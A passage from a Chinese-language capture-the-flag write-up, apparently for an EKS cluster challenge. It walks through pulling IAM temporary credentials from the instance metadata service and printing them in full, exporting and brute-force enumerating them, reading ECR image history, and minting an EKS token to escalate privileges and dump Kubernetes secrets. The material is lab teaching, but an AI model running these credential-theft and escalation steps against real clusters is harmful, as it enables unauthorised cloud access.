<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228151224987.png" alt="image-20231228151224987"></p>
<p>查看角色的临时凭据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228155616853.png" alt="image-20231228155616853"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;AccessKeyId&quot;</span><span class="punctuation">:</span><span class="string">&quot;ASIA2AVYNEVMXAE7X7P7&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Expiration&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-12-28 09:34:59+00:00&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SecretAccessKey&quot;</span><span class="punctuation">:</span><span class="string">&quot;3Z7ATVQPlzcBh9hQ0FiYOtbIT9g0jq/tv7yoSVl4&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SessionToken&quot;</span><span class="punctuation">:</span><span class="string">&quot;FwoGZXIvYXdzEEIaDGhraua/WnoiQClw/iK3AVpdk0hCdgAvcjERWcmwa+jJMsRW+Z/10iYlnh3PefD1gHZdvn/mDSKN2GdegizrmqYQ8pO7QxdhErdearkp7OnZdYZe0X1eOTj0BO0qHkXPow+VXXtOrmz22L+E+iN/rNaGd1UKt8FUhfrx/sBA0o81h5jtQwDNJo8y/ZdJIa+iYteGISMrK9zaXUIXhrIcXBBEvDz7F0wBgnB8fGfn78PgKqikUe+NYPmNGIKT2cRALbxbuj/YkCiz5rSsBjItmbQeo/a24SgZYnNOzLoT424BJu9wE0QQQhXntjpyR6Nl8X4AKeG7lVugrQ0m&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>将key信息导入环境变量便于使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AWS_ACCESS_KEY_ID=ASIA2AVYNEVMXAE7X7P7</span><br><span class="line"><span class="built_in">export</span> AWS_SECRET_ACCESS_KEY=3Z7ATVQPlzcBh9hQ0FiYOtbIT9g0jq/tv7yoSVl4</span><br><span class="line"><span class="built_in">export</span> AWS_SESSION_TOKEN=FwoGZXIvYXdzEEIaDGhraua/WnoiQClw/iK3AVpdk0hCdgAvcjERWcmwa+jJMsRW+Z/10iYlnh3PefD1gHZdvn/mDSKN2GdegizrmqYQ8pO7QxdhErdearkp7OnZdYZe0X1eOTj0BO0qHkXPow+VXXtOrmz22L+E+iN/rNaGd1UKt8FUhfrx/sBA0o81h5jtQwDNJo8y/ZdJIa+iYteGISMrK9zaXUIXhrIcXBBEvDz7F0wBgnB8fGfn78PgKqikUe+NYPmNGIKT2cRALbxbuj/YkCiz5rSsBjItmbQeo/a24SgZYnNOzLoT424BJu9wE0QQQhXntjpyR6Nl8X4AKeG7lVugrQ0m</span><br></pre></td></tr></table></figure>

<h4 id="3-2-执行命令查看角色信息"><a href="#3-2-执行命令查看角色信息" class="headerlink" title="3.2 执行命令查看角色信息"></a>3.2 执行命令查看角色信息</h4><p>查看账户信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>arn:</strong> 表示Amazon资源名称的前缀。</li>
<li><strong>aws:</strong> 表示ARN的命名空间，指示这是AWS资源。</li>
<li><strong>sts:</strong> 指示AWS Security Token Service (STS)。</li>
<li><strong>688655246681:</strong> AWS账户号码，唯一标识AWS账户。</li>
<li><strong>assumed-role:</strong> 角色扮演（Assume Role）操作的标识符。</li>
<li><strong>eks-challenge-cluster-nodegroup-NodeInstanceRole:</strong> 扮演的IAM角色的名称。在这个例子中，它是<code>eks-challenge-cluster-nodegroup-NodeInstanceRole</code>。</li>
<li><strong>i-0cb922c6673973282:</strong> 与角色相关联的实例的ID。在这个例子中，它是<code>i-0cb922c6673973282</code>。</li>
</ul>
<p>查看角色权限</p>
<p>使用github脚本查看，请见参考文献</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2023-12-28 16:27:00,284 - 37842 - [INFO] -- Account ARN : arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282</span><br><span class="line">2023-12-28 16:27:00,284 - 37842 - [INFO] -- Account Id  : 688655246681</span><br><span class="line">2023-12-28 16:27:00,284 - 37842 - [INFO] -- Account Path: assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282</span><br><span class="line">2023-12-28 16:27:02,885 - 37842 - [INFO] Attempting common-service describe / list brute force.</span><br><span class="line">2023-12-28 16:27:05,495 - 37842 - [INFO] -- ecr.get_authorization_token() worked!</span><br><span class="line">2023-12-28 16:27:05,751 - 37842 - [INFO] -- ecr.describe_repositories() worked!</span><br><span class="line">2023-12-28 16:27:23,679 - 37842 - [INFO] -- dynamodb.describe_endpoints() worked!</span><br><span class="line">2023-12-28 16:27:31,811 - 37842 - [INFO] -- sts.get_caller_identity() worked!</span><br></pre></td></tr></table></figure>

<p>查看服务器地区和仓库名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods -o yaml|grep image</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">image:</span> <span class="number">688655246681.</span><span class="string">dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span></span><br><span class="line"> <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line"> <span class="attr">image:</span> <span class="string">sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3</span></span><br><span class="line"> <span class="attr">imageID:</span> <span class="number">688655246681.</span><span class="string">dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span></span><br></pre></td></tr></table></figure>

<p>看到地区为us-west-1，仓库名为central_repo-aaf4a7c</p>
<p>查看镜像信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr describe-repositories --repository-names central_repo-aaf4a7c --region us-west-1</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;repositories&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;repositoryArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:ecr:us-west-1:688655246681:repository/central_repo-aaf4a7c&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;registryId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;repositoryName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;central_repo-aaf4a7c&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;repositoryUri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;createdAt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-11-01T13:31:27+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;imageTagMutability&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MUTABLE&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;imageScanningConfiguration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;scanOnPush&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;encryptionConfiguration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;encryptionType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AES256&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-3-crane登陆并对镜像进行解析"><a href="#3-3-crane登陆并对镜像进行解析" class="headerlink" title="3.3 crane登陆并对镜像进行解析"></a>3.3 crane登陆并对镜像进行解析</h4><p>获取登陆token，通过docker使用token进行登陆</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr get-login-password|crane auth login 688655246681.dkr.ecr.us-west-1.amazonaws.com -u AWS --password-stdin</span><br></pre></td></tr></table></figure>

<p>通过crane进行远程分析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span><br></pre></td></tr></table></figure>

<p>在记录中获取到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;architecture&quot;:&quot;amd64&quot;,&quot;config&quot;:&#123;&quot;Env&quot;:[&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;],&quot;Cmd&quot;:[&quot;/bin/sleep&quot;,&quot;3133337&quot;],&quot;ArgsEscaped&quot;:true,&quot;OnBuild&quot;:null&#125;,&quot;created&quot;:&quot;2023-11-01T13:32:07.782534085Z&quot;,&quot;history&quot;:[&#123;&quot;created&quot;:&quot;2023-07-18T23:19:33.538571854Z&quot;,&quot;created_by&quot;:&quot;/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / &quot;&#125;,&#123;&quot;created&quot;:&quot;2023-07-18T23:19:33.655005962Z&quot;,&quot;created_by&quot;:&quot;/bin/sh -c #(nop)  CMD [\&quot;sh\&quot;]&quot;,&quot;empty_layer&quot;:true&#125;,&#123;&quot;created&quot;:&quot;2023-11-01T13:32:07.782534085Z&quot;,&quot;created_by&quot;:&quot;RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge&#123;the_history_of_container_images_could_reveal_the_secrets_to_the_future&#125; ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit&quot;,&quot;comment&quot;:&quot;buildkit.dockerfile.v0&quot;&#125;,&#123;&quot;created&quot;:&quot;2023-11-01T13:32:07.782534085Z&quot;,&quot;created_by&quot;:&quot;CMD [\&quot;/bin/sleep\&quot; \&quot;3133337\&quot;]&quot;,&quot;comment&quot;:&quot;buildkit.dockerfile.v0&quot;,&quot;empty_layer&quot;:true&#125;],&quot;os&quot;:&quot;linux&quot;,&quot;rootfs&quot;:&#123;&quot;type&quot;:&quot;layers&quot;,&quot;diff_ids&quot;:[&quot;sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f&quot;,&quot;sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-第四部分"><a href="#4-第四部分" class="headerlink" title="4. 第四部分"></a>4. 第四部分</h2><p>在此任务中，您已获取节点的服务帐户凭据。为了便于将来参考，您可以在 pod 中方便地访问这些凭据。</p>
<p>有趣的事实：此挑战中突出显示的错误配置很常见，并且相同的技术可以应用于任何不强制实施 IMDSv2 跃点限制的 EKS 集群。</p>
<h3 id="Pod-Break"><a href="#Pod-Break" class="headerlink" title="Pod Break"></a>Pod Break</h3><p>You’re inside a vulnerable pod on an EKS cluster. Your pod’s service-account has no permissions. Can you navigate your way to access the EKS Node’s privileged service-account?</p>
<p>我们现在的node没有任何权限，我想要的是能够访问secrets和serviceaccount的权限，该如何进行提权呢。aws允许IAM用户创建临时访问凭据对集群进行访问，我们可以利用这一点来提升权限。</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/secrets.png" alt="secrets"></p>
<h4 id="4-1-查看我们的权限"><a href="#4-1-查看我们的权限" class="headerlink" title="4.1 查看我们的权限"></a>4.1 查看我们的权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list   </span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228194404583.png" alt="image-20231228194404583"></p>
<p>什么权限都没有</p>
<h4 id="4-2-更新token"><a href="#4-2-更新token" class="headerlink" title="4.2 更新token"></a>4.2 更新token</h4><p>首先要知道我们在集群中是什么角色</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>我们主要想知道的是集群名称：eks-challenge-cluster</p>
<p>接下来查看token</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws eks get-token --cluster-name eks-challenge-cluster --region us-west-1</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;kind&quot;:</span> <span class="string">&quot;ExecCredential&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;apiVersion&quot;:</span> <span class="string">&quot;client.authentication.k8s.io/v1beta1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;spec&quot;:</span> &#123;&#125;,</span><br><span class="line">    <span class="attr">&quot;status&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;expirationTimestamp&quot;:</span> <span class="string">&quot;2023-12-28T11:40:29Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;token&quot;:</span> <span class="string">&quot;k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk1ZVzdYTkhPNyUyRjIwMjMxMjI4JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyMzEyMjhUMTEyNjI5WiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFRVVhREl0d0s1NzlDYkd1RGQ0Z21TSzNBYnVZeHZZU1JBRGthUG01a0h5WW5IYyUyQjVUWVhLNjBpaVZwb3hHSUo4NTZOalRHZXBhUHVIVEtYTE9aZkN6TzBlMHglMkYzZ1RPM1loR0RNWnp4TWNpVGJRS2V4T05OJTJGd1VOR2ZVSGQ0aEV1TCUyRk9GNCUyRjh0Qkd1MVl1bjdGVCUyRkN4JTJCY0NQZFFDUW02YlZUREU1Zjc5Y0tRSUNBNTdkbUluQ014MmhNZUpiTEQyM3pNVmtGWVBRZDJwWTRWQkF6d2o2NkRNNTBOS1J4RVJpMzlRYXgyYTVla2dsa1VJWFBUNUkyUyUyQktndWhpblVKeUVMYnYyMkVXdWpTaTVzTFdzQmpJdHJCUTdzWjdGd2NMcTRiQUc3Z0o1c05vZ2FLdWpPcTk0ZTZ5MmRaOW9ESlZJZ3FkeDlqR2JtNFZBZ0NobSZYLUFtei1TaWduYXR1cmU9MmY0MjBlY2JkMjNlYmRmZGRlN2QxOGY3MWU4NWEzYjQ2NTllYzAxNTM5NWI1N2RhMjM2NDczOTYyOTVhYmE4Nw&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用token</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TOKEN1=$(aws  eks get-token --cluster-name eks-challenge-cluster --region us-west-1 | jq  -r .status.token)</span><br><span class="line">kubectl get pods --token=<span class="variable">$TOKEN1</span></span><br></pre></td></tr></table></figure>

<p>看一下我们现在的权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list --token=<span class="variable">$TOKEN1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228194208202.png" alt="image-20231228194208202"></p>
<p>发现已经可以查看serviceaccount和secrets了从而获取flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get secrets --token=<span class="variable">$TOKEN1</span> -o yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">items:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">data:</span></span><br><span class="line">    <span class="attr">flag:</span> <span class="string">d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-11-01T12:27:57Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">node-flag</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge4</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;883574&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">26461a29-ec72-40e1-adc7-99128ce664f7</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">Opaque</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">List</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="5-第五部分"><a href="#5-第五部分" class="headerlink" title="5. 第五部分"></a>5. 第五部分</h2><h3 id="Container-Secrets-Infrastructure"><a href="#Container-Secrets-Infrastructure" class="headerlink" title="Container Secrets Infrastructure"></a>Container Secrets Infrastructure</h3><p>You’ve successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the <em>s3access-sa</em> service account, and get the flag?</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/5.png" alt="5"></p>
<h4 id="5-1-IAM策略"><a href="#5-1-IAM策略" class="headerlink" title="5.1 IAM策略"></a>5.1 IAM策略</h4><p>允许的动作：列出s3 bucket中的资源、获取特定s3 bucket中的资源</p>
<p>允许的资源：arn:aws:s3:::challenge-flag-bucket-3ff1ae2、arn:aws:s3:::challenge-flag-bucket-3ff1ae2&#x2F;flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Policy&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Action&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;s3:GetObject&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">                ],</span><br><span class="line">                <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Resource&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag&quot;</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-2-Trust策略"><a href="#5-2-Trust策略" class="headerlink" title="5.2 Trust策略"></a>5.2 Trust策略</h4><p>允许使用web身份验证：允许了k8s中使用IAM角色进行web身份验证</p>
<p>指定了生效条件：</p>
<p>OIDC提供程序中的JWT的audience字段必须为sts.amazonaws.com</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Principal&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Federated&quot;</span>: <span class="string">&quot;arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Condition&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;StringEquals&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud&quot;</span>: <span class="string">&quot;sts.amazonaws.com&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-3-Permission策略"><a href="#5-3-Permission策略" class="headerlink" title="5.3 Permission策略"></a>5.3 Permission策略</h4><p>secrets：允许列出和获取</p>
<p>serviceaccounts：允许列出和获取</p>
<p>pods：允许列出和获取</p>
<p>serviceaccounts&#x2F;token：允许创建</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;secrets&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;serviceaccounts&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;pods&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;serviceaccounts/token&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;create&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-4-查看我们的权限"><a href="#5-4-查看我们的权限" class="headerlink" title="5.4 查看我们的权限"></a>5.4 查看我们的权限</h4><p>有一个值得注意的点：我们只能为debug-sa创建token，这里也是一个突破口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228203431104.png" alt="image-20231228203431104"></p>
<h4 id="5-5-查看集群中可用的信息"><a href="#5-5-查看集群中可用的信息" class="headerlink" title="5.5 查看集群中可用的信息"></a>5.5 查看集群中可用的信息</h4><p>查看pod</p>
